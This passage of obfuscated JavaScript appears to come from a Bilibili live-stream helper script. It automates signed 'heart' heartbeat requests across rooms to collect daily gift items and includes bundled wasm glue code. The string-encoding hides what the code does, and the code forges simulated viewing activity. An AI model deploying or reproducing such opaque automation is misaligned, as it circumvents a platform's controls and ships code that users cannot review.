_0x5a6964===_0x27be15;},'\x47\x62\x4f\x6d\x68':'\x62\x6d\x70\x75\x6b','\x51\x58\x48\x4f\x5a':function(_0x21f77c,_0x43812a,_0x25347c){return _0x21f77c(_0x43812a,_0x25347c);},'\x56\x42\x4d\x77\x55':_0x3d94('38','\x63\x75\x4f\x47'),'\x6f\x50\x4b\x55\x4e':_0x3d94('39','\x42\x5b\x76\x65'),'\x71\x70\x6b\x74\x59':function(_0x26ee8a,_0x1baf37,_0x372781){return _0x26ee8a(_0x1baf37,_0x372781);}};try{if(!HeartGift[_0x3d94('3a','\x66\x68\x7a\x4e')]||_0x1a59dd[_0x3d94('3b','\x48\x49\x75\x59')](this[_0x3d94('3c','\x26\x4c\x67\x57')],0x3))return;let _0x2417e2={'\x69\x64':[this[_0x3d94('3d','\x21\x78\x7a\x54')],this[_0x3d94('3e','\x40\x61\x26\x6d')],this['\x73\x65\x71'],this[_0x3d94('21','\x39\x46\x26\x44')]],'\x64\x65\x76\x69\x63\x65':[this['\x62\x75\x76\x69\x64'],this[_0x3d94('3f','\x66\x68\x7a\x4e')]],'\x65\x74\x73':this['\x65\x74\x73'],'\x62\x65\x6e\x63\x68\x6d\x61\x72\x6b':this[_0x3d94('40','\x4e\x39\x50\x38')],'\x74\x69\x6d\x65':this[_0x3d94('41','\x30\x69\x57\x42')],'\x74\x73':new Date()['\x67\x65\x74\x54\x69\x6d\x65'](),'\x75\x61':this['\x75\x61']};KeySign['\x63\x6f\x6e\x76\x65\x72\x74'](_0x2417e2);let _0x19334f=BiliPushUtils[_0x3d94('42','\x6a\x36\x4b\x43')](JSON[_0x3d94('43','\x24\x59\x36\x72')](_0x2417e2),this[_0x3d94('44','\x42\x4c\x4a\x4a')]);if(_0x19334f){if(_0x1a59dd[_0x3d94('45','\x66\x68\x7a\x4e')](_0x1a59dd[_0x3d94('46','\x24\x70\x59\x5b')],_0x1a59dd[_0x3d94('47','\x28\x52\x36\x6a')])){return e['\x5f\x6c']||(e['\x5f\x6c']=new l());}else{_0x2417e2['\x73']=_0x19334f;let _0x324154=await BiliPushUtils['\x41\x50\x49'][_0x3d94('48','\x4e\x39\x50\x38')]['\x68\x65\x61\x72\x74'](_0x2417e2);if(_0x1a59dd[_0x3d94('49','\x28\x52\x36\x6a')](_0x324154[_0x3d94('4a','\x78\x43\x42\x43')],0x0)){++HeartGift['\x74\x6f\x74\x61\x6c'];++this[_0x3d94('4b','\x66\x68\x7a\x4e')];this[_0x3d94('4c','\x42\x5b\x76\x65')]=_0x324154['\x64\x61\x74\x61'][_0x3d94('4d','\x51\x75\x6e\x4d')];this[_0x3d94('4e','\x31\x79\x25\x2a')]=_0x324154['\x64\x61\x74\x61'][_0x3d94('4f','\x48\x49\x75\x59')];this[_0x3d94('50','\x6d\x34\x4e\x42')]=_0x324154[_0x3d94('51','\x48\x49\x75\x59')][_0x3d94('52','\x65\x4f\x21\x7a')];this['\x73\x65\x63\x72\x65\x74\x5f\x72\x75\x6c\x65']=_0x324154['\x64\x61\x74\x61'][_0x3d94('53','\x6c\x73\x4e\x61')];if(_0x1a59dd['\x6a\x4c\x43\x7a\x58'](HeartGift[_0x3d94('54','\x7a\x55\x43\x53')],HeartGift[_0x3d94('55','\x43\x43\x5a\x7a')])&&HeartGift[_0x3d94('56','\x7a\x55\x43\x53')]){if(_0x1a59dd[_0x3d94('57','\x64\x58\x4c\x72')](_0x1a59dd[_0x3d94('58','\x66\x68\x7a\x4e')],_0x1a59dd['\x47\x62\x4f\x6d\x68'])){await _0x1a59dd[_0x3d94('59','\x21\x78\x7a\x54')](delayCall,()=>this[_0x3d94('5a','\x65\x4f\x21\x7a')](),_0x1a59dd[_0x3d94('5b','\x79\x49\x51\x23')](this[_0x3d94('41','\x30\x69\x57\x42')],0x3e8));}else{var _0x32689d=0x0;_0x1a59dd['\x6a\x43\x6c\x69\x4d'](r,_)&&(_0x32689d=n[r++]);var _0x2dc2dd=_0x1a59dd[_0x3d94('5c','\x78\x43\x42\x43')](_0x1a59dd[_0x3d94('5d','\x21\x78\x7a\x54')](_0x1a59dd['\x79\x4d\x74\x57\x67'](0x3f,E),0x6),_0x1a59dd[_0x3d94('5e','\x6e\x48\x77\x36')](0x3f,_0x32689d));if(i=_0x1a59dd[_0x3d94('5f','\x6e\x62\x69\x46')](_0x1a59dd[_0x3d94('60','\x30\x57\x28\x24')](c,0xc),_0x2dc2dd),_0x1a59dd[_0x3d94('61','\x26\x4c\x67\x57')](o,0xf0)){var _0x4a1191=0x0;_0x1a59dd[_0x3d94('62','\x79\x49\x51\x23')](r,_)&&(_0x4a1191=n[r++]),i=_0x1a59dd[_0x3d94('63','\x48\x49\x75\x59')](_0x1a59dd[_0x3d94('64','\x68\x41\x4e\x34')](_0x1a59dd[_0x3d94('65','\x6f\x4d\x61\x44')](_0x1a59dd[_0x3d94('66','\x6d\x34\x4e\x42')](0x7,c),0x12),_0x1a59dd['\x73\x41\x58\x68\x51'](_0x2dc2dd,0x6)),_0x1a59dd[_0x3d94('67','\x26\x4c\x67\x57')](0x3f,_0x4a1191)),a+=String['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'](_0x1a59dd['\x6e\x47\x6a\x65\x52'](0xd7c0,_0x1a59dd[_0x3d94('68','\x6e\x48\x77\x36')](i,0xa))),i=_0x1a59dd[_0x3d94('69','\x39\x2a\x72\x56')](0xdc00,_0x1a59dd[_0x3d94('6a','\x66\x5a\x29\x53')](0x3ff,i));}}}else{if(_0x1a59dd[_0x3d94('6b','\x28\x52\x36\x6a')](_0x1a59dd[_0x3d94('6c','\x51\x75\x6e\x4d')],_0x1a59dd['\x56\x42\x4d\x77\x55'])){if(!_0x1a59dd[_0x3d94('6d','\x30\x69\x57\x42')](o,e))return!0x1;var _0xfe5d41=_0x1a59dd[_0x3d94('6e','\x35\x70\x35\x57')](_,e);return _0x1a59dd['\x56\x52\x51\x45\x67'](!0x0,_0xfe5d41)?_0x1a59dd[_0x3d94('6f','\x40\x61\x26\x6d')](P,_0x1a59dd[_0x3d94('70','\x39\x2a\x72\x56')](f,this,r))[_0x3d94('71','\x66\x5a\x29\x53')](e):_0xfe5d41&&_0x1a59dd[_0x3d94('72','\x55\x32\x46\x64')](u,_0xfe5d41,this['\x5f\x69']);}else{if(HeartGift[_0x3d94('73','\x38\x67\x4e\x79')]){if(_0x1a59dd[_0x3d94('74','\x6a\x24\x33\x49')](_0x1a59dd[_0x3d94('75','\x31\x79\x25\x2a')],_0x1a59dd[_0x3d94('76','\x21\x78\x7a\x54')])){console[_0x3d94('77','\x68\x41\x4e\x34')]('\u5f53\u65e5\u5c0f\u5fc3\u5fc3\u6536\u96c6\u5b8c\u6bd5');HeartGift[_0x3d94('78','\x43\x79\x71\x48')]=![];_0x1a59dd['\x75\x79\x43\x42\x64'](runTomorrow,HeartGift[_0x3d94('79','\x38\x67\x4e\x79')]);}else{var _0x40524a=_0x1a59dd['\x6b\x70\x53\x6b\x52'](u)(t),_0x5de806=_0x40524a[_0x3d94('7a','\x6a\x36\x4b\x43')],_0x10f25b=e['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45']['\x61\x6c\x6c\x6f\x63'](_0x1a59dd[_0x3d94('7b','\x57\x71\x46\x36')](0x8,_0x5de806)),_0x4a940f=e[_0x3d94('7c','\x30\x69\x57\x42')]['\x61\x6c\x6c\x6f\x63'](_0x1a59dd[_0x3d94('7d','\x63\x26\x53\x39')](0x10,_0x5de806));e[_0x3d94('7e','\x7a\x55\x43\x53')][_0x1a59dd[_0x3d94('7f','\x78\x43\x42\x43')](r,0xc)]=0x8,e[_0x3d94('80','\x42\x4c\x4a\x4a')][_0x1a59dd[_0x3d94('81','\x4d\x40\x49\x4d')](r,0x4)]=_0x4a940f,e[_0x3d94('82','\x39\x46\x26\x44')][_0x1a59dd[_0x3d94('83','\x43\x79\x71\x48')](_0x1a59dd[_0x3d94('84','\x6e\x62\x69\x46')](r,0x4),0x4)]=_0x5de806,e['\x48\x45\x41\x50\x55\x33\x32'][_0x1a59dd['\x7a\x49\x55\x61\x43'](_0x1a59dd['\x4e\x50\x7a\x68\x6d'](r,0x8),0x4)]=_0x10f25b;for(var _0x1d9f41=0x0;_0x1a59dd['\x6a\x43\x6c\x69\x4d'](_0x1d9f41,_0x5de806);++_0x1d9f41){var _0x337fd4=_0x40524a[_0x1d9f41],_0x3ca1dc=_0x1a59dd[_0x3d94('85','\x30\x69\x57\x42')](_0x10f25b,_0x1a59dd[_0x3d94('86','\x7a\x55\x43\x53')](0x8,_0x1d9f41));e['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x3d94('87','\x31\x79\x25\x2a')](_0x3ca1dc,_0x337fd4),e[_0x3d94('88','\x6e\x48\x77\x36')]['\x66\x72\x6f\x6d\x5f\x6a\x73'](_0x1a59dd[_0x3d94('89','\x6f\x51\x44\x76')](_0x4a940f,_0x1a59dd[_0x3d94('8a','\x66\x68\x7a\x4e')](0x10,_0x1d9f41)),t[_0x337fd4]);}}}}}}}}}catch(_0x195a0e){this['\x65\x72\x72\x6f\x72']++;console[_0x3d94('8b','\x48\x53\x4a\x79')](_0x195a0e);await _0x1a59dd['\x71\x70\x6b\x74\x59'](delayCall,()=>this[_0x3d94('8c','\x39\x46\x26\x44')](),0x3e8);}}}const HeartGift={'\x74\x6f\x74\x61\x6c':0x0,'\x6d\x61\x78':0x19,'\x70\x72\x6f\x63\x65\x73\x73':!![],'\x72\x75\x6e':async()=>{var _0x2b41ff={'\x62\x63\x6b\x6b\x56':function(_0x3af206,_0x51a232){return _0x3af206===_0x51a232;},'\x4e\x65\x47\x4e\x57':function(_0xb6cb8a,_0x317866){return _0xb6cb8a>_0x317866;},'\x68\x73\x4a\x4f\x7a':'\u5f00\u59cb\u542f\u52a8\u5c0f\u5fc3\u5fc3\u5fc3\u8df3','\x4c\x73\x49\x59\x7a':function(_0xd1d544,_0x340536){return _0xd1d544==_0x340536;},'\x49\x53\x62\x62\x65':function(_0x4ce469,_0x22431d){return _0x4ce469===_0x22431d;},'\x47\x51\x4d\x55\x65':_0x3d94('8d','\x42\x4c\x4a\x4a'),'\x62\x78\x44\x4f\x64':function(_0xe54008,_0x1ab7d4,_0x201d2f){return _0xe54008(_0x1ab7d4,_0x201d2f);},'\x4c\x7a\x46\x44\x42':function(_0x2e9ae8,_0x1019ca,_0x492da4){return _0x2e9ae8(_0x1019ca,_0x492da4);},'\x61\x6f\x70\x78\x7a':function(_0x6941fa,_0x24bfdb){return _0x6941fa!==_0x24bfdb;},'\x79\x4b\x64\x4b\x67':_0x3d94('8e','\x64\x58\x4c\x72'),'\x5a\x6d\x49\x75\x46':function(_0x3fd741,_0x40495c,_0x37dd05){return _0x3fd741(_0x40495c,_0x37dd05);}};if(!HeartGift[_0x3d94('8f','\x65\x4f\x21\x7a')]){HeartGift['\x74\x6f\x74\x61\x6c']=0x0;HeartGift[_0x3d94('90','\x6a\x24\x33\x49')]=!![];}let _0x2a23b3=await Gift[_0x3d94('91','\x35\x70\x35\x57')]();if(_0x2a23b3&&_0x2b41ff['\x4e\x65\x47\x4e\x57'](_0x2a23b3[_0x3d94('92','\x5a\x59\x4f\x54')],0x0)){console['\x6c\x6f\x67'](_0x2b41ff[_0x3d94('93','\x30\x69\x57\x42')]);while(_0x2b41ff['\x4c\x73\x49\x59\x7a'](BiliPushUtils[_0x3d94('94','\x70\x59\x51\x52')],null)){if(_0x2b41ff[_0x3d94('95','\x24\x59\x36\x72')](_0x2b41ff[_0x3d94('96','\x5a\x59\x4f\x54')],_0x2b41ff[_0x3d94('97','\x6a\x24\x33\x49')])){await _0x2b41ff[_0x3d94('98','\x51\x75\x6e\x4d')](delayCall,()=>{},0x3e8);}else{a['\x73\x65\x74'](r,o);}}for(let _0x33ab66 of _0x2a23b3){let _0x311ecb=await API['\x72\x6f\x6f\x6d'][_0x3d94('99','\x43\x79\x71\x48')](_0x2b41ff[_0x3d94('9a','\x73\x5e\x29\x54')](parseInt,_0x33ab66[_0x3d94('9b','\x43\x79\x71\x48')],0xa));if(_0x2b41ff[_0x3d94('9c','\x6a\x24\x33\x49')](_0x311ecb[_0x3d94('9d','\x71\x58\x62\x6c')],0x0)){if(_0x2b41ff[_0x3d94('9e','\x31\x79\x25\x2a')](_0x2b41ff[_0x3d94('9f','\x48\x49\x75\x59')],_0x2b41ff['\x79\x4b\x64\x4b\x67'])){return _0x2b41ff[_0x3d94('a0','\x6e\x62\x69\x46')](e[0x0],r);}else{console[_0x3d94('a1','\x48\x49\x75\x59')]('\u5f00\u59cb\u6536\u96c6\x5b'+_0x33ab66[_0x3d94('a2','\x51\x6a\x52\x40')]+_0x3d94('a3','\x6c\x73\x4e\x61')+_0x311ecb[_0x3d94('2b','\x35\x70\x35\x57')][_0x3d94('a4','\x79\x49\x51\x23')]+_0x3d94('a5','\x30\x57\x28\x24'));new HeartGiftRoom(_0x311ecb[_0x3d94('a6','\x6f\x51\x44\x76')]);await _0x2b41ff[_0x3d94('a7','\x40\x61\x26\x6d')](delayCall,()=>{},0x1388);}}}}}};(window[_0x3d94('a8','\x4d\x40\x49\x4d')]=window[_0x3d94('a9','\x65\x4f\x21\x7a')]||[])['\x70\x75\x73\x68']([[0x2e],{2205:function(_0x2137d0,_0x35c498,_0x523368){var _0x19f44f={'\x78\x78\x54\x43\x5a':function(_0x13a787,_0x91d660){return _0x13a787===_0x91d660;},'\x72\x6d\x78\x54\x42':_0x3d94('aa','\x30\x69\x57\x42'),'\x43\x54\x69\x4d\x67':function(_0xd80f10,_0x5a8c39){return _0xd80f10+_0x5a8c39;},'\x4e\x61\x73\x62\x5a':function(_0x1b802c,_0xc509e){return _0x1b802c!==_0xc509e;},'\x53\x56\x6c\x74\x4b':function(_0x39891b,_0x2cd36f){return _0x39891b/_0x2cd36f;},'\x7a\x70\x7a\x76\x45':function(_0x12d1df,_0x50cf79){return _0x12d1df===_0x50cf79;},'\x68\x48\x45\x42\x79':function(_0x5d238e,_0x4b8211){return _0x5d238e===_0x4b8211;},'\x42\x45\x75\x68\x69':'\x46\x6a\x77\x41\x48','\x42\x4b\x6a\x6e\x71':function(_0x2c78a3,_0x1fbdbc){return _0x2c78a3/_0x1fbdbc;},'\x45\x46\x47\x66\x4f':function(_0x93c6cb,_0x50b82e){return _0x93c6cb/_0x50b82e;},'\x57\x49\x62\x75\x42':function(_0x3f6af8,_0x544b76){return _0x3f6af8===_0x544b76;},'\x66\x72\x6e\x6f\x49':'\x70\x56\x6f\x46\x47','\x53\x58\x6b\x72\x55':function(_0x4c2da8,_0x56183d){return _0x4c2da8+_0x56183d;},'\x4d\x6f\x58\x48\x4c':function(_0x3c03dc,_0x4c522a){return _0x3c03dc/_0x4c522a;},'\x78\x58\x74\x50\x58':function(_0x103d6b,_0x4ac8ba){return _0x103d6b<_0x4ac8ba;},'\x72\x4b\x7a\x62\x4d':function(_0x198804,_0x690f80){return _0x198804*_0x690f80;},'\x43\x56\x6c\x70\x4f':function(_0xdf048c,_0x2f7364){return _0xdf048c===_0x2f7364;},'\x44\x48\x53\x67\x44':'\x53\x56\x48\x4d\x68','\x47\x65\x54\x57\x6e':function(_0x3c8f86,_0x5a54e8){return _0x3c8f86+_0x5a54e8;},'\x41\x76\x6f\x65\x6f':function(_0x339b57,_0x51b821){return _0x339b57/_0x51b821;},'\x72\x51\x51\x46\x4c':function(_0x2e1362,_0x2b7f5c){return _0x2e1362+_0x2b7f5c;},'\x75\x45\x77\x59\x62':function(_0x2e447b,_0x204eca){return _0x2e447b/_0x204eca;},'\x66\x57\x6d\x45\x4f':function(_0x16237a,_0x3f8799){return _0x16237a+_0x3f8799;},'\x66\x6d\x4c\x79\x58':function(_0x1fbb58,_0x53d5f6){return _0x1fbb58/_0x53d5f6;},'\x4d\x41\x6c\x45\x77':function(_0x1a3757,_0x49b7f6){return _0x1a3757+_0x49b7f6;},'\x77\x56\x42\x5a\x61':function(_0x29c43f,_0x536229){return _0x29c43f+_0x536229;},'\x56\x66\x43\x4a\x63':function(_0x7e857a,_0x21c4d2){return _0x7e857a/_0x21c4d2;},'\x4f\x42\x56\x64\x74':function(_0x1fbdd6,_0x47c6d3){return _0x1fbdd6===_0x47c6d3;},'\x73\x73\x44\x4f\x74':function(_0x1069a2,_0x172b5d){return _0x1069a2===_0x172b5d;},'\x67\x68\x56\x4f\x70':function(_0x5e6bab,_0x434cbb){return _0x5e6bab===_0x434cbb;},'\x51\x4d\x65\x4c\x42':'\x58\x7a\x73\x71\x69','\x66\x74\x56\x65\x7a':_0x3d94('ab','\x39\x46\x26\x44'),'\x44\x52\x4b\x53\x5a':function(_0x2bb7e3,_0x1d3d2e){return _0x2bb7e3/_0x1d3d2e;},'\x46\x73\x61\x7a\x71':function(_0x92fbe0,_0x291981){return _0x92fbe0+_0x291981;},'\x4d\x4e\x68\x50\x43':function(_0x351a27,_0x2d4fa9){return _0x351a27/_0x2d4fa9;},'\x46\x45\x6f\x56\x49':function(_0x2024ba,_0x18c725){return _0x2024ba===_0x18c725;},'\x6b\x49\x47\x43\x4d':function(_0x232de7,_0x30d191){return _0x232de7===_0x30d191;},'\x71\x6c\x77\x5a\x5a':_0x3d94('ac','\x6a\x36\x4b\x43'),'\x4a\x43\x4e\x6c\x6a':function(_0x9ca61b,_0x578fbc){return _0x9ca61b/_0x578fbc;},'\x6d\x69\x65\x56\x6e':function(_0x4e253c,_0x527e2c){return _0x4e253c/_0x527e2c;},'\x6e\x7a\x6b\x41\x54':function(_0x4fe889,_0x424c79){return _0x4fe889+_0x424c79;},'\x6c\x4b\x69\x56\x4d':function(_0x9a010d,_0x3bb047){return _0x9a010d>_0x3bb047;},'\x48\x51\x77\x54\x6b':function(_0x237def,_0x18dfd1){return _0x237def+_0x18dfd1;},'\x59\x49\x55\x76\x4f':function(_0x14fe50,_0x55ad32){return _0x14fe50>=_0x55ad32;},'\x4c\x52\x5a\x46\x69':function(_0x32e4fd,_0x39cbce){return _0x32e4fd<=_0x39cbce;},'\x53\x4a\x66\x4a\x76':function(_0xf5724a,_0x2397aa){return _0xf5724a|_0x2397aa;},'\x54\x75\x42\x52\x76':function(_0x56ac32,_0x16290e){return _0x56ac32+_0x16290e;},'\x48\x61\x66\x6e\x5a':function(_0x15062e,_0x3d87af){return _0x15062e<<_0x3d87af;},'\x74\x56\x62\x53\x52':function(_0x837a4b,_0x225bea){return _0x837a4b&_0x225bea;},'\x52\x6e\x57\x50\x62':function(_0x3d6e24,_0x4beded){return _0x3d6e24|_0x4beded;},'\x71\x45\x6f\x45\x49':function(_0x3ad946,_0x47ca8e){return _0x3ad946>>_0x47ca8e;},'\x4d\x55\x4f\x5a\x74':function(_0x5aede5,_0x4bcb2d){return _0x5aede5|_0x4bcb2d;},'\x5a\x75\x41\x55\x6a':function(_0x567fc0,_0x3dfb57){return _0x567fc0&_0x3dfb57;},'\x7a\x44\x47\x45\x4f':function(_0x25871d,_0x16036d){return _0x25871d|_0x16036d;},'\x71\x50\x6e\x58\x58':function(_0x1078c9,_0x3b88f8){return _0x1078c9<=_0x3b88f8;},'\x4e\x74\x73\x45\x55':function(_0x3c1e43,_0x3f0ee8){return _0x3c1e43|_0x3f0ee8;},'\x49\x51\x67\x7a\x54':function(_0x8347d9,_0x459c38){return _0x8347d9>>_0x459c38;},'\x47\x44\x61\x74\x4c':function(_0x586fcd,_0x4f1322){return _0x586fcd|_0x4f1322;},'\x79\x59\x63\x72\x4b':function(_0x35cb0e,_0x25bbe6){return _0x35cb0e>>_0x25bbe6;},'\x64\x44\x50\x42\x6f':function(_0x4dfe63,_0x2562f0){return _0x4dfe63|_0x2562f0;},'\x52\x68\x52\x63\x4b':_0x3d94('ad','\x55\x32\x46\x64'),'\x55\x50\x51\x78\x66':function(_0x1d6f6d,_0x535713){return _0x1d6f6d|_0x535713;},'\x78\x73\x44\x6f\x6f':function(_0x1b7609,_0x553e10){return _0x1b7609<_0x553e10;},'\x42\x55\x4f\x68\x76':function(_0x53fa2c,_0x5f5c03){return _0x53fa2c|_0x5f5c03;},'\x7a\x77\x55\x4b\x49':function(_0x2abdf0,_0x27a50e){return _0x2abdf0<<_0x27a50e;},'\x78\x54\x74\x75\x55':function(_0x4fe473,_0x56ef5f){return _0x4fe473&_0x56ef5f;},'\x4b\x66\x66\x78\x73':function(_0x56cb65,_0x59dfc0){return _0x56cb65>=_0x59dfc0;},'\x49\x78\x73\x55\x4f':function(_0x33077b,_0x359eb9){return _0x33077b<_0x359eb9;},'\x4e\x4d\x74\x72\x68':function(_0x5ef921,_0x16a475){return _0x5ef921<<_0x16a475;},'\x49\x42\x7a\x6e\x73':function(_0x3f822d,_0x21bead){return _0x3f822d&_0x21bead;},'\x42\x67\x4a\x70\x74':function(_0x89a6b5,_0x39e475){return _0x89a6b5|_0x39e475;},'\x53\x64\x50\x51\x62':function(_0x46bba4,_0x181172){return _0x46bba4<<_0x181172;},'\x4b\x63\x76\x74\x4a':'\x79\x47\x4b\x4f\x4c','\x66\x76\x71\x43\x51':_0x3d94('ae','\x53\x43\x5d\x55'),'\x79\x50\x66\x41\x6a':function(_0x2d410a,_0x1f0abe){return _0x2d410a<_0x1f0abe;},'\x6e\x47\x50\x6e\x79':function(_0x49b3f7,_0xd8c402){return _0x49b3f7|_0xd8c402;},'\x79\x41\x67\x64\x4b':function(_0x185b53,_0x2005b2){return _0x185b53&_0x2005b2;},'\x4c\x67\x4e\x6f\x4e':function(_0x260215,_0x580e0a){return _0x260215&_0x580e0a;},'\x7a\x4c\x68\x78\x6a':function(_0xffeb53,_0x35b1fb){return _0xffeb53+_0x35b1fb;},'\x56\x77\x55\x47\x59':function(_0x506ccf,_0x4f940e){return _0x506ccf>>_0x4f940e;},'\x4b\x55\x49\x44\x74':function(_0x93c0a6,_0x32ee94){return _0x93c0a6+_0x32ee94;},'\x63\x72\x4e\x67\x53':function(_0x2831a1,_0x5c7f37){return _0x2831a1&_0x5c7f37;},'\x61\x49\x53\x61\x70':function(_0x90a29b,_0x393ba0){return _0x90a29b/_0x393ba0;},'\x55\x58\x57\x59\x42':'\x65\x63\x7a\x56\x73','\x6c\x67\x4f\x70\x49':_0x3d94('af','\x71\x58\x62\x6c'),'\x58\x57\x55\x4c\x58':function(_0x5a2198,_0x432f17){return _0x5a2198===_0x432f17;},'\x55\x76\x58\x63\x67':function(_0xe18b64,_0x44bcbb){return _0xe18b64===_0x44bcbb;},'\x4d\x70\x47\x4d\x77':'\x68\x73\x4a\x70\x4c','\x6d\x4a\x46\x42\x77':_0x3d94('b0','\x21\x78\x7a\x54'),'\x4f\x55\x4a\x66\x52':function(_0x232d96,_0x26a653){return _0x232d96 in _0x26a653;},'\x6a\x4a\x46\x6c\x50':function(_0x17e859,_0x4bc29a){return _0x17e859==_0x4bc29a;},'\x61\x78\x47\x4a\x6d':function(_0x1293d3,_0x180e4a){return _0x1293d3<_0x180e4a;},'\x64\x61\x4a\x67\x6d':function(_0x28ed57,_0x451bb3){return _0x28ed57<=_0x451bb3;},'\x5a\x56\x68\x51\x64':function(_0x5cc01d,_0x5448e0){return _0x5cc01d+_0x5448e0;},'\x5a\x63\x78\x72\x49':function(_0x4e9041,_0x5ac1fa){return _0x4e9041<<_0x5ac1fa;},'\x5a\x62\x70\x50\x4d':function(_0x4cae3c,_0x137944){return _0x4cae3c&_0x137944;},'\x67\x51\x66\x5a\x65':function(_0x5080ca,_0x28dc51){return _0x5080ca<=_0x28dc51;},'\x68\x76\x4f\x55\x6c':function(_0x57a058,_0xe592a7){return _0x57a058 instanceof _0xe592a7;},'\x61\x75\x57\x64\x62':function(_0x1e4663,_0x4b6e13){return _0x1e4663===_0x4b6e13;},'\x70\x49\x51\x4a\x78':'\x53\x65\x63\x75\x72\x69\x74\x79\x45\x72\x72\x6f\x72','\x69\x48\x6b\x4c\x4c':_0x3d94('b1','\x26\x4c\x67\x57'),'\x79\x49\x71\x48\x42':_0x3d94('b2','\x6c\x73\x4e\x61'),'\x6c\x59\x6a\x61\x79':function(_0x137efe,_0x2e6ca4){return _0x137efe===_0x2e6ca4;},'\x6f\x74\x4a\x66\x67':_0x3d94('b3','\x39\x2a\x72\x56'),'\x4e\x61\x69\x69\x5a':'\x7a\x6a\x49\x6f\x71','\x75\x73\x70\x45\x54':function(_0x491d3d,_0x347bf4){return _0x491d3d===_0x347bf4;},'\x6c\x65\x62\x42\x70':function(_0x20f004,_0x3db89c){return _0x20f004!=_0x3db89c;},'\x73\x4d\x4f\x63\x6f':_0x3d94('b4','\x71\x58\x62\x6c'),'\x4a\x46\x64\x46\x79':'\x75\x56\x4b\x52\x52','\x71\x6b\x64\x47\x47':_0x3d94('b5','\x6e\x62\x69\x46'),'\x6c\x68\x76\x64\x72':_0x3d94('b6','\x66\x5a\x29\x53'),'\x46\x41\x6e\x79\x79':_0x3d94('b7','\x42\x4c\x4a\x4a'),'\x69\x67\x76\x49\x55':function(_0x4f3450,_0x5ecf26){return _0x4f3450===_0x5ecf26;},'\x6f\x63\x49\x79\x6d':_0x3d94('b8','\x71\x58\x62\x6c'),'\x4b\x67\x66\x55\x76':function(_0x4c5dde,_0x53c2bf){return _0x4c5dde!==_0x53c2bf;},'\x65\x4f\x67\x76\x44':_0x3d94('b9','\x30\x69\x57\x42'),'\x6e\x64\x52\x68\x4e':function(_0x2ee9ac,_0xc4f45d){return _0x2ee9ac===_0xc4f45d;},'\x4c\x77\x46\x47\x56':_0x3d94('ba','\x40\x61\x26\x6d'),'\x51\x6a\x46\x77\x64':_0x3d94('bb','\x43\x29\x5d\x66'),'\x51\x5a\x4d\x4b\x6c':function(_0x12340b,_0x50a1c6){return _0x12340b instanceof _0x50a1c6;},'\x74\x49\x73\x50\x6b':function(_0x34cdf1,_0x3b6257){return _0x34cdf1===_0x3b6257;},'\x73\x41\x79\x49\x64':_0x3d94('bc','\x29\x5e\x36\x61'),'\x74\x62\x75\x76\x46':_0x3d94('bd','\x30\x57\x28\x24'),'\x48\x47\x75\x63\x6c':function(_0x2c3c98,_0x5353f6){return _0x2c3c98|_0x5353f6;},'\x4c\x69\x78\x77\x4f':function(_0x58ef10,_0x14c8bf){return _0x58ef10<<_0x14c8bf;},'\x66\x50\x53\x59\x4f':function(_0x5a9c09,_0x20d963){return _0x5a9c09&_0x20d963;},'\x4a\x4a\x58\x63\x56':function(_0x4e98ca,_0xc7e48b){return _0x4e98ca&_0xc7e48b;},'\x46\x45\x44\x50\x43':function(_0x2b237f,_0x902066){return _0x2b237f<_0x902066;},'\x62\x65\x4e\x56\x77':function(_0x51b25b,_0x3cc8b9){return _0x51b25b&_0x3cc8b9;},'\x41\x41\x6f\x71\x70':function(_0x456c07,_0x52f6f7){return _0x456c07<<_0x52f6f7;},'\x4e\x6e\x65\x4e\x57':function(_0x2817a4,_0xb2b6b9){return _0x2817a4>>_0xb2b6b9;},'\x70\x56\x74\x44\x69':function(_0x38290d,_0x47df2a){return _0x38290d===_0x47df2a;},'\x56\x41\x45\x64\x70':_0x3d94('be','\x4d\x40\x49\x4d'),'\x50\x6d\x44\x73\x75':_0x3d94('bf','\x51\x6a\x52\x40'),'\x67\x68\x71\x48\x71':function(_0x1c535d,_0x35e0fe){return _0x1c535d&_0x35e0fe;},'\x55\x44\x52\x68\x55':function(_0x251fa7,_0x54de76){return _0x251fa7|_0x54de76;},'\x6b\x6c\x67\x4c\x50':function(_0x3c69c7,_0x70df23){return _0x3c69c7>>_0x70df23;},'\x48\x4a\x4f\x57\x61':function(_0x21b355,_0x3d92b9){return _0x21b355<=_0x3d92b9;},'\x6f\x55\x78\x6e\x49':function(_0x591e31,_0xfb844f){return _0x591e31&_0xfb844f;},'\x53\x75\x4a\x5a\x54':function(_0x52cdcf,_0x1b17f6){return _0x52cdcf|_0x1b17f6;},'\x68\x6d\x68\x63\x50':function(_0x1fc9b4,_0x44254e){return _0x1fc9b4&_0x44254e;},'\x53\x55\x65\x41\x4c':function(_0x88bf3b,_0x1081a8){return _0x88bf3b|_0x1081a8;},'\x48\x52\x61\x49\x4e':function(_0x33d138,_0x2ea9bb){return _0x33d138&_0x2ea9bb;},'\x77\x58\x4a\x4b\x62':function(_0xd75278,_0x401d2b){return _0xd75278>>_0x401d2b;},'\x45\x56\x64\x6b\x6e':function(_0x2ffcd8,_0x48e943,_0x7df8bc){return _0x2ffcd8(_0x48e943,_0x7df8bc);},'\x6d\x53\x48\x79\x48':_0x3d94('c0','\x43\x43\x5a\x7a'),'\x42\x71\x5a\x4d\x73':function(_0x1ae0e3,_0x23e468){return _0x1ae0e3===_0x23e468;},'\x4b\x75\x67\x6b\x4e':function(_0x2ad646,_0xd8366d){return _0x2ad646===_0xd8366d;},'\x79\x55\x69\x41\x58':function(_0x482ee0,_0x1f6d4b){return _0x482ee0===_0x1f6d4b;},'\x7a\x66\x49\x47\x76':_0x3d94('c1','\x24\x59\x36\x72'),'\x42\x53\x6b\x4c\x55':'\x41\x6c\x72\x65\x61\x64\x79\x20\x64\x72\x6f\x70\x70\x65\x64\x20\x46\x6e\x4d\x75\x74\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x63\x61\x6c\x6c\x65\x64\x21','\x56\x70\x71\x45\x72':_0x3d94('c2','\x71\x58\x62\x6c'),'\x41\x50\x42\x61\x69':'\x76\x69\x69','\x45\x4b\x6e\x4d\x50':_0x3d94('c3','\x4e\x39\x50\x38'),'\x41\x54\x47\x43\x56':function(_0x555c38,_0x499177){return 